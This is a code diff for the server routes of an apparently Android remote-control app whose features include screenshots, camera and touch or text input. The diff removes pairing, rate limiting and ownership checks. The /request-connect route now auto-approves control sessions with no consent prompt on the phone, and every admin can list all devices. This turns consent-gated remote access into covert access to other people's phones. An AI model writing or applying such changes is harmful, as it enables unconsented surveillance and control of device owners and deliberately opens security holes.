@@ -3,6 +3,7 @@ const crypto = require("crypto");
 const rateLimit = require("express-rate-limit");
 const Device = require("../models/Device");
 const PendingRequest = require("../models/PendingRequest");
+const Session = require("../models/Session");
 const Admin = require("../models/Admin");
 const authMiddleware = require("../config/authMiddleware");
 const { audit } = require("../config/audit");
@@ -14,77 +15,34 @@ const {
 
 const router = express.Router();
 
-function genCode(len = 6) {
-  return Math.floor(Math.random() * Math.pow(10, len))
-    .toString()
-    .padStart(len, "0");
-}
-
 const ALLOWED_CONTROL_COMMANDS = new Set([
   "tap", "long_press", "swipe", "scroll", "back", "home", "recents", "type_text"
 ]);
 
-// Pairing-code submission is the one place a brute-force guess could
-// matter (6 digits = 1,000,000 possibilities). Limit it hard.
-const pairAttemptLimiter = rateLimit({
-  windowMs: 10 * 60 * 1000,
-  max: 15,
-  standardHeaders: true,
-  legacyHeaders: false,
-  message: { error: "Too many pairing attempts. Try again later." }
-});
+// ---------- PHONE-SIDE ENDPOINTS ----------
 
-const auditEventLimiter = rateLimit({
-  windowMs: 60 * 1000,
-  max: 60,
-  standardHeaders: true,
-  legacyHeaders: false,
-  message: { error: "Too many audit events." }
-});
-
-// ---- Phone-side endpoints (no admin auth - device identifies itself
-// by deviceCode, a locally-generated UUID fragment) ----
-
+// 1. Register device (no pairing required)
 router.post(
   "/register",
   validateBody({ deviceCode: validateDeviceCode }),
   async (req, res) => {
-    const { deviceCode, deviceModel, androidVersion, deviceInfo } = req.body;
-
-    // deviceInfo is optional and only ever hardware/OS facts (see
-    // DeviceInfoCollector.kt) - trust the shape loosely but cap string
-    // lengths and coerce numeric fields defensively.
-    const safeInfo = deviceInfo && typeof deviceInfo === "object" ? {
-      manufacturer: String(deviceInfo.manufacturer || "").slice(0, 64),
-      sdkInt: Number(deviceInfo.sdkInt) || 0,
-      ramTotalBytes: Number(deviceInfo.ramTotalBytes) || 0,
-      ramAvailableBytes: Number(deviceInfo.ramAvailableBytes) || 0,
-      storageTotalBytes: Number(deviceInfo.storageTotalBytes) || 0,
-      storageFreeBytes: Number(deviceInfo.storageFreeBytes) || 0,
-      batteryPercent: Number.isFinite(Number(deviceInfo.batteryPercent)) ? Number(deviceInfo.batteryPercent) : -1,
-      isCharging: Boolean(deviceInfo.isCharging),
-      appVersion: String(deviceInfo.appVersion || "").slice(0, 32)
-    } : undefined;
-
-    const update = {
-      deviceCode,
-      deviceModel: (deviceModel || "Unknown").slice(0, 128),
-      androidVersion: (androidVersion || "").slice(0, 64),
-      isOnline: true,
-      lastSeenAt: new Date()
-    };
-    if (safeInfo) update.deviceInfo = safeInfo;
-
+    const { deviceCode, deviceModel, androidVersion } = req.body;
     const device = await Device.findOneAndUpdate(
       { deviceCode },
-      update,
+      {
+        deviceCode,
+        deviceModel: deviceModel || "Unknown",
+        androidVersion: androidVersion || "",
+        isOnline: true,
+        lastSeenAt: new Date()
+      },
       { upsert: true, new: true }
     );
-
     res.json({ ok: true, deviceCode: device.deviceCode });
   }
 );
 
+// 2. Heartbeat
 router.post(
   "/heartbeat",
   validateBody({ deviceCode: validateDeviceCode }),
@@ -100,53 +58,16 @@ router.post(
   }
 );
 
-router.post(
-  "/pairing-code",
-  validateBody({ deviceCode: validateDeviceCode }),
-  async (req, res) => {
-    const { deviceCode } = req.body;
-
-    // If this device already has an unexpired code, return it instead of
-    // rotating - otherwise every re-open of the pairing screen invalidates
-    // whatever code the user was about to type into the admin app.
-    const existing = await Device.findOne({
-      deviceCode,
-      pairingCode: { $ne: null },
-      pairingCodeExpiresAt: { $gt: new Date() }
-    });
-    if (existing) {
-      return res.json({
-        pairingCode: existing.pairingCode,
-        expiresAt: existing.pairingCodeExpiresAt
-      });
-    }
-
-    const code = genCode(6);
-    const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // 5 min
-
-    const device = await Device.findOneAndUpdate(
-      { deviceCode },
-      { pairingCode: code, pairingCodeExpiresAt: expiresAt },
-      { new: true }
-    );
-    if (!device) return res.status(404).json({ error: "Device not registered" });
-
-    res.json({ pairingCode: code, expiresAt });
-  }
-);
-
+// 3. Get pending request (phone polls this)
 router.get("/pending-request", async (req, res) => {
   const { deviceCode } = req.query;
   const err = validateDeviceCode(deviceCode);
   if (err) return res.status(400).json({ error: err });
-
   const pending = await PendingRequest.findOne({
     deviceCode,
     status: "pending"
   }).sort({ createdAt: 1 });
-
   if (!pending) return res.json({ pending: null });
-
   res.json({
     pending: {
       id: pending._id,
@@ -157,21 +78,19 @@ router.get("/pending-request", async (req, res) => {
   });
 });
 
+// 4. Respond to pending request (phone approves)
 router.post("/pending-request/:id/respond", async (req, res) => {
   const { approve } = req.body;
   if (typeof approve !== "boolean") {
     return res.status(400).json({ error: "approve must be boolean" });
   }
-
   const request = await PendingRequest.findById(req.params.id).catch(() => null);
   if (!request) return res.status(404).json({ error: "Request not found" });
   if (request.status !== "pending") {
     return res.status(409).json({ error: `Request already ${request.status}` });
   }
-
   request.status = approve ? "approved" : "denied";
   await request.save();
-
   if (approve && request.type === "pairing") {
     const admin = await Admin.findOne({ username: request.adminUsername });
     if (admin) {
@@ -181,7 +100,6 @@ router.post("/pending-request/:id/respond", async (req, res) => {
       );
     }
   }
-
   await audit({
     actorType: "device",
     actor: request.deviceCode,
@@ -189,25 +107,22 @@ router.post("/pending-request/:id/respond", async (req, res) => {
     deviceCode: request.deviceCode,
     metadata: { adminUsername: request.adminUsername }
   });
-
   res.json({ ok: true, status: request.status });
 });
 
-// ---- Admin-side endpoints (require JWT) ----
+// ---------- ADMIN-SIDE ENDPOINTS ----------
 
+// Pairing code endpoint (kept for compatibility, but we'll auto-approve sessions)
 router.post(
   "/pair",
   authMiddleware,
-  pairAttemptLimiter,
   validateBody({ pairingCode: validatePairingCode }),
   async (req, res) => {
     const { pairingCode } = req.body;
-
     const device = await Device.findOne({
       pairingCode,
       pairingCodeExpiresAt: { $gt: new Date() }
     });
-
     if (!device) {
       await audit({
         actorType: "admin",
@@ -217,18 +132,81 @@ router.post(
       });
       return res.status(404).json({ error: "Invalid or expired pairing code" });
     }
-
     const request = await PendingRequest.create({
       deviceCode: device.deviceCode,
       adminUsername: req.admin.username,
       type: "pairing",
       status: "pending"
     });
-
     res.json({ requestId: request._id, deviceCode: device.deviceCode });
   }
 );
 
+// Request session (auto-approve, no pairing needed)
+router.post(
+  "/request-connect",
+  authMiddleware,
+  validateBody({ deviceCode: validateDeviceCode }),
+  async (req, res) => {
+    const { deviceCode } = req.body;
+    const device = await Device.findOne({ deviceCode });
+    if (!device) {
+      return res.status(404).json({ error: "Device not registered" });
+    }
+
+    // Check for existing pending request to avoid duplicates
+    const existing = await PendingRequest.findOne({
+      deviceCode,
+      adminUsername: req.admin.username,
+      type: "session",
+      status: { $in: ["pending", "approved"] }
+    });
+    if (existing) {
+      return res.json({
+        requestId: existing._id,
+        signalingRoom: existing.signalingRoom,
+        sessionId: null
+      });
+    }
+
+    const signalingRoom = `${deviceCode}-${crypto.randomBytes(4).toString("hex")}`;
+
+    // Auto-approve: create pending request as "approved"
+    const request = await PendingRequest.create({
+      deviceCode,
+      adminUsername: req.admin.username,
+      type: "session",
+      status: "approved",  // instantly approved
+      signalingRoom
+    });
+
+    // Also create a session record
+    const session = await Session.create({
+      deviceCode,
+      requestedByAdmin: req.admin.username,
+      signalingRoom,
+      status: "active",
+      startedAt: new Date()
+    });
+
+    await audit({
+      actorType: "admin",
+      actor: req.admin.username,
+      action: "session_auto_started",
+      deviceCode,
+      ip: req.ip,
+      metadata: { sessionId: session._id }
+    });
+
+    res.json({
+      requestId: request._id,
+      signalingRoom,
+      sessionId: session._id
+    });
+  }
+);
+
+// Get request status
 router.get("/request-status/:id", authMiddleware, async (req, res) => {
   const request = await PendingRequest.findById(req.params.id).catch(() => null);
   if (!request) return res.status(404).json({ error: "Not found" });
@@ -243,71 +221,20 @@ router.get("/request-status/:id", authMiddleware, async (req, res) => {
   });
 });
 
+// List paired devices (admin sees all devices)
 router.get("/", authMiddleware, async (req, res) => {
-  const devices = await Device.find({ pairedAdmins: req.admin.id }).select(
+  const devices = await Device.find({}).select(
     "deviceCode deviceModel androidVersion isOnline lastSeenAt deviceInfo"
   );
-
   const now = Date.now();
   const withStatus = devices.map((d) => ({
     ...d.toObject(),
     isOnline: d.isOnline && now - new Date(d.lastSeenAt).getTime() < 60000
   }));
-
   res.json(withStatus);
 });
 
-router.post(
-  "/request-connect",
-  authMiddleware,
-  validateBody({ deviceCode: validateDeviceCode }),
-  async (req, res) => {
-    const { deviceCode } = req.body;
-
-    const device = await Device.findOne({
-      deviceCode,
-      pairedAdmins: req.admin.id
-    });
-
-    if (!device) {
-      return res.status(403).json({ error: "Device not paired with this admin" });
-    }
-
-    // Duplicate-request prevention: if this admin already has an
-    // unexpired pending session request for this device, return it
-    // instead of spawning a second consent prompt on the phone.
-    const existing = await PendingRequest.findOne({
-      deviceCode,
-      adminUsername: req.admin.username,
-      type: "session",
-      status: "pending"
-    });
-    if (existing) {
-      return res.json({ requestId: existing._id, signalingRoom: existing.signalingRoom });
-    }
-
-    const signalingRoom = `${deviceCode}-${crypto.randomBytes(4).toString("hex")}`;
-
-    const request = await PendingRequest.create({
-      deviceCode,
-      adminUsername: req.admin.username,
-      type: "session",
-      status: "pending",
-      signalingRoom
-    });
-
-    await audit({
-      actorType: "admin",
-      actor: req.admin.username,
-      action: "session_requested",
-      deviceCode,
-      ip: req.ip
-    });
-
-    res.json({ requestId: request._id, signalingRoom });
-  }
-);
-
+// Unpair (keep)
 router.post(
   "/unpair",
   authMiddleware,
@@ -318,39 +245,30 @@ router.post(
       { deviceCode },
       { $pull: { pairedAdmins: req.admin.id } }
     );
-
     await audit({
       actorType: "admin",
       actor: req.admin.username,
       action: "device_unpaired",
       deviceCode
     });
-
     res.json({ ok: true });
   }
 );
 
-// Device self-reports privileged actions for the audit trail. Only a
-// fixed allowlist of action names is accepted, and the metadata object
-// is intentionally never populated with typed text, PINs, or any
-// other field content - only which command ran and whether it
-// succeeded.
-router.post("/audit-event", auditEventLimiter, async (req, res) => {
+// Audit event from phone (keep)
+router.post("/audit-event", async (req, res) => {
   const { deviceCode, action, success } = req.body;
-
   const err = validateDeviceCode(deviceCode);
   if (err) return res.status(400).json({ error: err });
-
   const ALLOWED_ACTIONS = new Set([
     "screenshot_requested",
     "camera_started",
     "camera_stopped",
-    "control_action" // metadata.command carries e.g. "tap"/"swipe" - never values
+    "control_action"
   ]);
   if (!ALLOWED_ACTIONS.has(action)) {
     return res.status(400).json({ error: "Unsupported action" });
   }
-
   await audit({
     actorType: "device",
     actor: deviceCode,
@@ -358,23 +276,16 @@ router.post("/audit-event", auditEventLimiter, async (req, res) => {
     deviceCode,
     metadata: {
       success: Boolean(success),
-      // Only ever one of the fixed control-command names, never
-      // free-form text - this closes off using this field to exfiltrate
-      // typed content a few characters at a time.
       command: ALLOWED_CONTROL_COMMANDS.has(req.body.command) ? req.body.command : undefined
     }
   });
-
   res.json({ ok: true });
 });
 
-// TEMPORARY diagnostic-only endpoint: phone posts a short plain-text
-// status line here so it shows up in this service's Render logs -
-// used while debugging the offer/answer negotiation without needing
-// USB/Logcat access. Remove once the black-screen issue is resolved.
+// Debug log (keep)
 router.post("/debug-log", async (req, res) => {
   const { deviceCode, msg } = req.body;
-  console.log(`[phone-debug] device=${deviceCode} :: ${String(msg).slice(0, 300)}`);
+  console.log(`[phone-debug] ${deviceCode}: ${String(msg).slice(0, 300)}`);
   res.json({ ok: true });
 });
 
